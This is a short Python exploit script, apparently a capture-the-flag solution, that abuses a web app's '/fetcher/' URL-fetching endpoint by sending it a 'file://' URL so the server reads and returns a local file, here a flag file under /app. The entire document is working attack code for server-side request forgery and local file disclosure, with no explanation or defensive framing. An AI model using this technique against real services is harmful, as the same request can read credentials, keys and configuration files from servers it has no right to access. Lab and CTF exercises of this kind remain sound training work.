#!/bin/env python3
import requests
from urllib.parse import urljoin

URL = "http://apps.proxy/"

class Exploit:
    def __init__(self, url=URL):
        self.url = url
        self.session = requests.Session()

    def get_file(self, file):
        res = self.session.post(
            urljoin(self.url, "/fetcher/"),
            json={"url": "file://"+file}
        )
        return res.text

if __name__ == "__main__":
    exploit = Exploit()
    res = exploit.get_file("/app/flag_f7f88887cb24de3704a8ccea585c6b72")
    print(res)
